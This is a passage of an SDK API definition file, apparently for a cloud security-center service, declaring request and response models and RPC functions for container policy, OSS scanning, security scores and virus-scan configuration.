*   **false**', example='true'),
}

model GetOpaClusterImageListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetOpaClusterImageListResponseBody(name='body'),
}

async function getOpaClusterImageList(request: GetOpaClusterImageListRequest): GetOpaClusterImageListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetOpaClusterImageList', 'POST', '/', 'json', false, 'json', request);
}

model GetOpaClusterLabelListRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.

>  You can call the [DescribeGroupedContainerInstances](~~182997~~) operation to query the IDs of clusters.', example='c556c8133b5ad4378b7fc533ddbda****', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 200. If you leave the PageSize parameter empty, 200 entries are returned by default. Maximum value: 200.

>  We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  tagName?: string(name='TagName', description='The name of the tag.', example='test', position='Query'),
}

model GetOpaClusterLabelListResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
  data?: [ 
    {
      tagName?: string(name='TagName', description='The name of the tag that is added to the container.', example='test'),
    }
  ](name='Data', description='The information about the tags that are added to containers.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='95D35EB3-1F8E-5E07-A68E-BE018C9B80CB'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetOpaClusterLabelListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetOpaClusterLabelListResponseBody(name='body'),
}

async function getOpaClusterLabelList(request: GetOpaClusterLabelListRequest): GetOpaClusterLabelListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetOpaClusterLabelList', 'POST', '/', 'json', false, 'json', request);
}

model GetOpaClusterNamespaceListRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster that you want to query.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='ca0faf43e33904ecbb6c695df7906****', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1', position='Query'),
  nameSpaceName?: string(name='NameSpaceName', description='The name of the namespace.', example='sit', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='20', position='Query'),
}

model GetOpaClusterNamespaceListResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='0'),
  data?: [ 
    {
      nameSpaceName?: string(name='NameSpaceName', description='The name of the namespace.', example='testNameSpace'),
    }
  ](name='Data', description='The namespaces.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='384BFAF1-FC41-58DD-97DD-9D361ADF377D'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetOpaClusterNamespaceListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetOpaClusterNamespaceListResponseBody(name='body'),
}

async function getOpaClusterNamespaceList(request: GetOpaClusterNamespaceListRequest): GetOpaClusterNamespaceListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetOpaClusterNamespaceList', 'POST', '/', 'json', false, 'json', request);
}

model GetOpaPluginStatusRequest {
  clusterIds: [ string ](name='ClusterIds', description='The cluster IDs.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', position='Query'),
}

model GetOpaPluginStatusResponseBody = {
  installStatus?: [ 
    {
      clusterId?: string(name='ClusterId', description='The cluster ID.', example='c60b77fe62093480db6164a3c2fa****'),
      installStatus?: boolean(name='InstallStatus', description='Indicates whether the component is installed. Valid values:

*   **true**
*   **false**', example='true'),
    }
  ](name='InstallStatus', description='The installation status of the components that are required for clusters protected by proactive defense for containers.'),
  requestId?: string(name='RequestId', description='The request ID.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
}

model GetOpaPluginStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetOpaPluginStatusResponseBody(name='body'),
}

async function getOpaPluginStatus(request: GetOpaPluginStatusRequest): GetOpaPluginStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetOpaPluginStatus', 'POST', '/', 'json', false, 'json', request);
}

model GetOpaStrategyTemplateSummaryRequest {
}

model GetOpaStrategyTemplateSummaryResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: [ 
    {
      count?: int32(name='Count', description='The number of times that the template is used.', example='2'),
      description?: string(name='Description', description='The description of the template.', example='Custom defense configuration'),
      templateId?: long(name='TemplateId', description='The ID of the template.', example='1'),
      templateName?: string(name='TemplateName', description='The name of the template.', example='Blank template'),
    }
  ](name='Data', description='The usage statistics about the templates provided for rules of the at-risk image blocking type.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='54572138-3390-5774-B71D-799DC8C2161B'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetOpaStrategyTemplateSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetOpaStrategyTemplateSummaryResponseBody(name='body'),
}

async function getOpaStrategyTemplateSummary(request: GetOpaStrategyTemplateSummaryRequest): GetOpaStrategyTemplateSummaryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetOpaStrategyTemplateSummary', 'POST', '/', 'json', false, 'json', request);
}

model GetOssBucketScanStatisticRequest {
  bucketNameList?: [ string ](name='BucketNameList', position='Query'),
}

model GetOssBucketScanStatisticResponseBody = {
  data?: {
    expireTime?: long(name='ExpireTime', example='1714442403000'),
    highRisk?: long(name='HighRisk', example='0'),
    lowRisk?: long(name='LowRisk', example='0'),
    mediumRisk?: long(name='MediumRisk', example='0'),
    noScanBucket?: int32(name='NoScanBucket', example='1'),
    remainAuth?: int32(name='RemainAuth', example='1'),
    riskBucket?: int32(name='RiskBucket', example='1'),
    scanObject?: long(name='ScanObject', example='1'),
    totalBucket?: int32(name='TotalBucket', example='1'),
    totalObject?: long(name='TotalObject', example='1'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='FAC50208-E56B-5CC8-8738-2B219D1A****'),
}

model GetOssBucketScanStatisticResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetOssBucketScanStatisticResponseBody(name='body'),
}

async function getOssBucketScanStatistic(request: GetOssBucketScanStatisticRequest): GetOssBucketScanStatisticResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetOssBucketScanStatistic', 'POST', '/', 'json', false, 'json', request);
}

model GetOssScanConfigRequest {
}

model GetOssScanConfigResponseBody = {
  data?: {
    bucketNameList?: [ string ](name='BucketNameList'),
    enable?: int32(name='Enable', example='1'),
    endTime?: string(name='EndTime', example='00:00:00'),
    keySuffixList?: [ string ](name='KeySuffixList'),
    scanDayList?: [ int32 ](name='ScanDayList'),
    startTime?: string(name='StartTime', example='00:00:00'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='E10BAF1C-A6C5-51E2-866C-76D5922E****'),
}

model GetOssScanConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetOssScanConfigResponseBody(name='body'),
}

async function getOssScanConfig(request: GetOssScanConfigRequest): GetOssScanConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetOssScanConfig', 'POST', '/', 'json', false, 'json', request);
}

model GetPropertyScheduleConfigRequest {
  type?: string(name='Type', description='The type of the asset fingerprints. Valid values:

*   **scheduler_port_period**: listening port
*   **scheduler_process_period**: running process
*   **scheduler_account_period**: account
*   **scheduler_software_period**: software
*   **scheduler_cron_period**: scheduled task
*   **scheduler_sca_period**: middleware
*   **scheduler_autorun_period**: startup item
*   **scheduler_lkm_period**: kernel module
*   **scheduler_sca_proxy_period**: website', example='scheduler_sca_period', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****', position='Query'),
}

model GetPropertyScheduleConfigResponseBody = {
  propertyScheduleConfig?: {
    nextScheduleTime?: long(name='NextScheduleTime', description='The timestamp when the next collection of asset fingerprints starts. Unit: milliseconds.', example='1671630647018'),
    scheduleTime?: string(name='ScheduleTime', description='The collection frequency of asset fingerprints. Valid values:

*   **0**: disabled, which indicates that the asset fingerprints are not automatically or periodically collected.
*   **1**: collects asset fingerprints once an hour.
*   **3**: collects asset fingerprints once every 3 hours.
*   **12**: collects asset fingerprints once every 12 hours.
*   **24**: collects asset fingerprints once a day.
*   **168**: collects asset fingerprints once every 7 days.', example='3'),
    type?: string(name='Type', description='The type of the asset fingerprints. Valid values:

*   **scheduler_port_period**: listening port
*   **scheduler_process_period**: running process
*   **scheduler_account_period**: account
*   **scheduler_software_period**: software
*   **scheduler_cron_period**: scheduled task
*   **scheduler_sca_period**: middleware
*   **scheduler_autorun_period**: startup item
*   **scheduler_lkm_period**: kernel module
*   **scheduler_sca_proxy_period**: website', example='scheduler_account_period'),
  }(name='PropertyScheduleConfig', description='The configurations for the collection frequency of asset fingerprints.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B37C9052-A73E-4707-A024-92477028****'),
}

model GetPropertyScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetPropertyScheduleConfigResponseBody(name='body'),
}

async function getPropertyScheduleConfig(request: GetPropertyScheduleConfigRequest): GetPropertyScheduleConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetPropertyScheduleConfig', 'POST', '/', 'json', false, 'json', request);
}

model GetRulesCountRequest {
}

model GetRulesCountResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
  totalSystemClientRuleCount?: long(name='TotalSystemClientRuleCount', description='The total number of system defense rules.', example='10'),
  totalUserDefineRuleCount?: long(name='TotalUserDefineRuleCount', description='The total number of custom defense rules.', example='10'),
}

model GetRulesCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetRulesCountResponseBody(name='body'),
}

async function getRulesCount(request: GetRulesCountRequest): GetRulesCountResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetRulesCount', 'POST', '/', 'json', false, 'json', request);
}

model GetSasContainerWebDefenseRuleCriteriaRequest {
  value?: string(name='Value', example='525', position='Query'),
}

model GetSasContainerWebDefenseRuleCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', example='name'),
      type?: string(name='Type', example='select'),
      values?: string(name='Values', example='athor_bid'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
}

model GetSasContainerWebDefenseRuleCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetSasContainerWebDefenseRuleCriteriaResponseBody(name='body'),
}

async function getSasContainerWebDefenseRuleCriteria(request: GetSasContainerWebDefenseRuleCriteriaRequest): GetSasContainerWebDefenseRuleCriteriaResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetSasContainerWebDefenseRuleCriteria', 'POST', '/', 'json', false, 'json', request);
}

model GetSecurityScoreRuleRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh', position='Query'),
}

model GetSecurityScoreRuleResponseBody = {
  enableStatus?: boolean(name='EnableStatus', description='The status of the custom settings of the security score feature.

*   true: enabled
*   false: disabled', example='true'),
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
  securityScoreRuleList?: [ 
    {
      ruleType?: string(name='RuleType', description='The deducted module that is supported by the security score feature. Valid values:

*   SS_REINFORCE: issue in key feature configuration
*   SS_ALARM: unhandled alert
*   SS_VUL: unfixed vulnerability
*   SS_HC: baseline risk
*   SS_CLOUD_HC: risk item of configuration assessment
*   SS_AK: risk of AccessKey pair leaks', example='SS_ALARM'),
      score?: int32(name='Score', description='The deduction threshold of the deduction module.

>  Valid values: 0 to 100. The sum of the deduction thresholds for all deduction modules must be equal to 100.', example='20'),
      securityScoreItemList?: [ 
        {
          score?: int32(name='Score', description='The penalty point of the deduction item.', example='3'),
          scoreThreshold?: int32(name='ScoreThreshold', description='The threshold for the deduction item.

>  Valid values: 0 to the deduction threshold of the deduction module.', example='5'),
          subRuleType?: string(name='SubRuleType', description='The deduction item of the deduction module. The following list describes the deduction modules and their deduction items:

*   SS_REINFORCE: issue in key feature configuration

    *   XPRESS_INSTALL: Security Center is not authorized.
    *   REINFORCE_SUSPICIOUS: The antivirus feature is disabled.
    *   RANSOMWARE: The anti-ransomware policy is disabled.
    *   WEB_LOCK: The web tamper proofing feature is disabled.
    *   VIRUS_SCHEDULE_SCAN: The periodic virus scan policy is disabled.
    *   IMAGE_REPO_SCAN: The range of container image scan is not configured.
    *   IMAGE_SCAN_TASK: The feature of one-click scan of container images for security risks is not performed.

*   SS_ALARM: unhandled alert.

    *   ALARM_SERIOUS: An unhandled high-risk alert event is detected.
    *   ALARM_SUSPICIOUS: An unhandled medium-risk alarm event is detected.
    *   ALARM_REMIND: An unhandled low-risk alarm event is detected.

*   SS_VUL: unfixed vulnerability

    *   CMS_UNFIX: An unfixed Web-CMS vulnerability is detected.
    *   WIN_UNFIX: An unfixed Windows host vulnerability is detected.
    *   CVE_UNFIX: An unfixed Linux host vulnerability is detected.
    *   ERM_UNFIX: An unfixed urgent vulnerability is detected.
    *   ERM_UNCHECK: An undetected urgent vulnerability exists.

*   SS_HC: baseline risks

    *   WEAK_EXPLOIT: Weak passwords are exposed to the Internet.
    *   WEAK_PASSWORD: Weak passwords exist.
    *   HC_EXPLOIT: The data source may be hacked.
    *   HC_OTHER_WARNING: Security configuration risks exist.

*   SS_CLOUD_HC: Cloud platform configuration check item problem.

    *   CSPM_CIEM_NOT_PASS: A CIEM check item failed the check.
    *   CSPM_RISK_NOT_PASS: A security risk check item failed the check.
    *   CSPM_COMPLIANCE_NOT_PASS: A compliance check item failed the check.

*   SS_AK: risk of AccessKey pair leaks', example='ALARM_SERIOUS'),
          title?: string(name='Title', description='The description of the deduction item in a deduction module.', example='Unhandled Urgent Alert Event Exists'),
        }
      ](name='SecurityScoreItemList', description='The deduction items of the deduction module.'),
      title?: string(name='Title', description='The description of the deduction module.', example='Unhandled Alerts'),
    }
  ](name='SecurityScoreRuleList', description='The list of deducted modules that are supported by the security score feature.'),
}

model GetSecurityScoreRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetSecurityScoreRuleResponseBody(name='body'),
}

async function getSecurityScoreRule(request: GetSecurityScoreRuleRequest): GetSecurityScoreRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetSecurityScoreRule', 'POST', '/', 'json', false, 'json', request);
}

model GetSensitiveDefineRuleConfigRequest {
  lang?: string(name='Lang', example='zh', position='Query'),
}

model GetSensitiveDefineRuleConfigResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    id?: long(name='Id', example='44616'),
    ruleCount?: int32(name='RuleCount', example='100'),
    ruleTree?: [ 
      {
        classKey?: string(name='ClassKey', example='password'),
        className?: string(name='ClassName', example='password'),
        ruleList?: [ 
          {
            ruleKey?: string(name='RuleKey', example='huaweicloud_ak'),
            ruleName?: string(name='RuleName', example='huaweicloud_ak'),
            selected?: boolean(name='Selected', example='true'),
          }
        ](name='RuleList'),
      }
    ](name='RuleTree'),
    selectedCount?: int32(name='SelectedCount', example='99'),
  }(name='Data'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92****'),
  success?: boolean(name='Success', example='true'),
}

model GetSensitiveDefineRuleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetSensitiveDefineRuleConfigResponseBody(name='body'),
}

async function getSensitiveDefineRuleConfig(request: GetSensitiveDefineRuleConfigRequest): GetSensitiveDefineRuleConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetSensitiveDefineRuleConfig', 'POST', '/', 'json', false, 'json', request);
}

model GetServiceTrailRequest {
  regionId?: string(name='RegionId', description='The ID of the region in which the instance resides. Valid value:

*   **cn-hangzhou**: center.
*   **ap-southeast-1**: Singapore.', example='cn-hangzhou', position='Query'),
}

model GetServiceTrailResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='C699E4E4-F2F4-58FC-A949-457FFE59****'),
  serviceTrail?: {
    config?: string(name='Config', description='The status of the service trail. Valid values:

*   **on:**
*   **off:**', example='on'),
    createTime?: long(name='CreateTime', description='The timestamp generated when the service trail was created. Unit: milliseconds.', example='1687250241000'),
    updateTime?: long(name='UpdateTime', description='The timestamp generated when the service trail was last updated. Unit: milliseconds.', example='1687250241000'),
  }(name='ServiceTrail', description='The configurations of the service trail.'),
}

model GetServiceTrailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetServiceTrailResponseBody(name='body'),
}

async function getServiceTrail(request: GetServiceTrailRequest): GetServiceTrailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetServiceTrail', 'POST', '/', 'json', false, 'json', request);
}

model GetStrategyTemplateDetailRequest {
  strategyId?: long(name='StrategyId', description='The ID of the template.

>  You can call the [GetOpaStrategyTemplateSummary](~~GetOpaStrategyTemplateSummary~~) operation to query the IDs of templates.', example='2', position='Query'),
}

model GetStrategyTemplateDetailResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    alarmDetail?: {
      baseline?: {
        item?: [ 
          {
            id?: string(name='Id', description='The unique identifier of the baseline check item.', example='ak_leak'),
            name?: string(name='Name', description='The name of the baseline check item.', example='Access Key plaintext storage'),
          }
        ](name='Item', description='The baseline items.'),
        riskLevel?: [ string ](name='RiskLevel', description='The severities of the baselines. Valid values:

*   **high**
*   **medium**
*   **low**'),
      }(name='Baseline', description='The configuration of the baseline.'),
      maliciousFile?: {
        item?: [ 
          {
            id?: string(name='Id', description='The unique identifier of the malicious sample.', example='test'),
            name?: string(name='Name', description='The name of the malicious sample.', example='test'),
          }
        ](name='Item', description='The items on which malicious samples are detected.'),
        riskLevel?: [ string ](name='RiskLevel', description='The severities of the malicious samples.'),
      }(name='MaliciousFile', description='The configuration of the alert rule for the malicious sample.'),
      vul?: {
        item?: [ 
          {
            id?: string(name='Id', description='The ID of the vulnerability.', example='AVD-2023-1680169'),
            name?: string(name='Name', description='The alias of the vulnerability.', example='ezOffice evoInterfaceServlet Info Leak'),
          }
        ](name='Item', description='The items on which vulnerabilities are detected.'),
        riskLevel?: [ string ](name='RiskLevel', description='The severities of the vulnerabilities.'),
      }(name='Vul', description='The configuration of the vulnerability detection rule.'),
    }(name='AlarmDetail', description='The configuration of the rule.'),
    clusterId?: string(name='ClusterId', description='The cluster ID.', example='c8ca91e0907d94efaba7fb0827eb9****'),
    clusterName?: string(name='ClusterName', description='The name of the cluster.', example='hhht-cluster-02'),
    description?: string(name='Description', description='The description of the rule.', example='Custom defense configuration'),
    imageName?: [ string ](name='ImageName', description='The names of images.'),
    label?: [ string ](name='Label', description='The tags that are added to the containers.'),
    maliciousImage?: boolean(name='MaliciousImage', description='Indicates whether the rule supports malicious Internet images. Valid values:

*   **true**
*   **false**', example='false'),
    namespace?: [ string ](name='Namespace', description='The namespaces.'),
    ruleAction?: int32(name='RuleAction', description='The action on requests. Valid values:

*   **1**: trigger alerts
*   **2**: block
*   **3**: allow', example='1'),
    strategyId?: long(name='StrategyId', description='The ID of the rule.', example='1005'),
    strategyName?: string(name='StrategyName', description='The name of the rule.', example='Blank template'),
    strategyTemplateId?: long(name='StrategyTemplateId', description='The ID of the template.', example='1204'),
    unScanedImage?: boolean(name='UnScanedImage', description='Indicates whether the rule supports unscanned images. Valid values:

*   **true**
*   **false**', example='false'),
    whiteList?: [ string ](name='WhiteList', description='The whitelists of tags that are added to images.'),
  }(name='Data', description='The details of the template.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='1E36BEEA-0B27-58CC-8319-50279203B048'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetStrategyTemplateDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetStrategyTemplateDetailResponseBody(name='body'),
}

async function getStrategyTemplateDetail(request: GetStrategyTemplateDetailRequest): GetStrategyTemplateDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetStrategyTemplateDetail', 'POST', '/', 'json', false, 'json', request);
}

model GetSuspiciousStatisticsRequest {
  groupIdList: string(name='GroupIdList', description='The ID of the asset group. Separate multiple IDs with commas (,).

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.', example='9997897', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='10.12.XX.XX', position='Query'),
}

model GetSuspiciousStatisticsResponseBody = {
  remindCount?: int32(name='RemindCount', description='The number of alerts whose Emergency level is Reminder.', example='0'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='84092B42-1A59-4F34-8DF8-1D93520990A5'),
  seriousCount?: int32(name='SeriousCount', description='The number of alerts whose Emergency level is Urgent.', example='1'),
  suspiciousCount?: int32(name='SuspiciousCount', description='The number of alerts whose Emergency level is Suspicious.', example='8'),
  totalCount?: int32(name='TotalCount', description='The total number of alerts.', example='9'),
}

model GetSuspiciousStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetSuspiciousStatisticsResponseBody(name='body'),
}

async function getSuspiciousStatistics(request: GetSuspiciousStatisticsRequest): GetSuspiciousStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetSuspiciousStatistics', 'POST', '/', 'json', false, 'json', request);
}

model GetSwitchRegionDetailRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en', position='Query'),
}

model GetSwitchRegionDetailResponseBody = {
  data?: {
    gmtIsAgreeModified?: long(name='GmtIsAgreeModified', description='The time when the permissions were modified.', example='1692858597000'),
    gmtNoticed?: long(name='GmtNoticed', description='The notification time.', example='1692858597000'),
    isAgree?: string(name='IsAgree', description='Indicates whether the migration is approved.', example='true'),
    isNoticed?: string(name='IsNoticed', description='Indicates whether the notification is sent.', example='YES'),
    regionStatus?: [ 
      {
        ecsCount?: int32(name='EcsCount', description='The number of ECS instances.', example='27'),
        gmtPlanSwitchTime?: long(name='GmtPlanSwitchTime', description='The time when the migration is scheduled.', example='1692858597000'),
        regionId?: string(name='RegionId', description='The region in which the server resides.', example='us-east-1'),
        status?: int32(name='Status', description='The migration status. Valid values:

*   **0**: pending
*   **1**: successful', example='0'),
      }
    ](name='RegionStatus', description='The status of the switching to the region.'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='30CBF632-109F-596F-97F2-451C8B2A****'),
}

model GetSwitchRegionDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetSwitchRegionDetailResponseBody(name='body'),
}

async function getSwitchRegionDetail(request: GetSwitchRegionDetailRequest): GetSwitchRegionDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetSwitchRegionDetail', 'POST', '/', 'json', false, 'json', request);
}

model GetUserLangRequest {
}

model GetUserLangResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='23AD0BD2-8771-5647-819E-6BA51E21****'),
  sasUserLang?: {
    lang?: string(name='Lang', description='The language specified for log analysis. Valid values:

*   zh: Chinese
*   en: English', example='zh'),
  }(name='SasUserLang', description='The language settings.'),
}

model GetUserLangResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetUserLangResponseBody(name='body'),
}

async function getUserLang(request: GetUserLangRequest): GetUserLangResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetUserLang', 'POST', '/', 'json', false, 'json', request);
}

model GetVirusScanConfigRequest {
  taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: a virus scan task.', example='VIRUS_VUL_SCHEDULE_SCAN', position='Query'),
}

model GetVirusScanConfigResponseBody = {
  data?: {
    configId?: string(name='ConfigId', description='The ID of the task configuration.

> You can call the [DescribeCycleTaskList](~~DescribeCycleTaskList~~) operation to query the IDs of task configurations.', example='97a1fed216908e417407344e1505xxxx'),
    enable?: int32(name='Enable', description='Indicates whether the periodic scan feature is enabled. Valid value:

*   **1**: The feature is enabled
*   **0**: The feature is disabled.', example='1'),
    intervalPeriod?: int32(name='IntervalPeriod', description='The interval at which virus scan tasks are run.', example='7'),
    periodUnit?: string(name='PeriodUnit', description='The unit of the interval at which virus scan tasks are run.

*   The value is fixed as **day**.', example='day'),
    scanPath?: [ string ](name='ScanPath', description='The file paths.'),
    scanType?: string(name='ScanType', description='The type of the virus scan task. Valid values:

*   **system**: automatic scan.
*   **user**: custom scan.', example='user'),
    selectionKey?: string(name='SelectionKey', description='The key that stores the asset information.

> You can call the [GetAssetSelectionConfig](~~GetAssetSelectionConfig~~) operation to obtain the key value.', example='345ddbea-a57f-437e-832f-fb7a1202xxxx'),
    targetEndTime?: int32(name='TargetEndTime', description='The end time of the virus scan task. The time is a time frame.', example='6'),
    targetStartTime?: int32(name='TargetStartTime', description='The start time of the virus scan task. The time is a time frame.', example='0'),
    taskType?: string(name='TaskType', description='The type of the task. Valid value:

*   **VIRUS_VUL_SCHEDULE_SCAN**: a virus scan task.', example='VIRUS_VUL_SCHEDULE_SCAN'),
  }(name='Data', description='The data returned if the request was successful.'),
  requestId?: string(name='RequestId', description='The request ID.', example='028CF634-5268-5660-9575-48C9ED6BDEFC'),
}

model GetVirusScanConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetVirusScanConfigResponseBody(name='body'),
}

async function getVirusScanConfig(request: GetVirusScanConfigRequest): GetVirusScanConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetVirusScanConfig', 'POST', '/', 'json', false, 'json', request);
}

model GetVirusScanLatestTaskStatisticRequest {
}

model GetVirusScanLatestTaskStatisticResponseBody = {
  data?: {
    completeMachine?: int32(name='CompleteMachine', description='The number of machines on which the virus scan task is complete.', example='2'),
    machineName?: string(name='MachineName', description='The name of the machine.', example='testMahine1'),
    progress?: string(name='Progress', description='The progress of the virus scan task in percentage.', example='92'),
    riskLevel?: string(name='RiskLevel', description='The highest risk level of the detected alerts. Valid values:

*   **high**
*   **medium**
*   **low**', example='medium'),
    safeMachine?: int32(name='SafeMachine', description='The number of safe machines that are detected.', example='1'),
    scanMachine?: int32(name='ScanMachine', description='The number of machines that are scanned.', example='3'),
    scanPath?: [ string ](name='ScanPath', description='The paths of files that were scanned. This value is returned only when ScanType is set to user.'),
    scanTime?: long(name='ScanTime', description='The timestamp generated when the virus scan task was performed. Unit: milliseconds.', example='1681145862000'),
    scanType?: string(name='ScanType', description='The type of the virus scan. Valid values:

*   **system**: automatic scan.
*   **user**: custom scan.', example='system'),
    status?: int32(name='Status', description='The status of the virus scan task.

**Valid values for a main task**:

*   **0**: The main task is to be started.
*   **10**: The main task is running.
*   **100**: The main task is complete.

**Valid values for a subtask**:

*   **0**: The subtask is to be started.
*   **20**: The scan script is sent.
*   **50**: The subtask is running.
*   **100**: The subtask is complete.', example='0'),
    suspiciousCount?: int32(name='SuspiciousCount', description='The number of alerts that are detected.', example='2'),
    suspiciousMachine?: int32(name='SuspiciousMachine', description='The number of suspicious machines that are detected.', example='2'),
    taskId?: string(name='TaskId', description='The ID of the virus scan task.', example='fc98d58eb56f699d49bf7ebbd6d7****'),
    unCompleteMachine?: int32(name='UnCompleteMachine', description='The number of machines on which the virus scan task was not complete or failed.', example='1'),
  }(name='Data', description='The information about the virus scan task.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7532B7EE-7CE7-5F4D-BF04-B12447DDCAE1'),
}

model GetVirusScanLatestTaskStatisticResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetVirusScanLatestTaskStatisticResponseBody(name='body'),
}

async function getVirusScanLatestTaskStatistic(request: GetVirusScanLatestTaskStatisticRequest): GetVirusScanLatestTaskStatisticResponse {
  @handler.validateRequestModel(request);
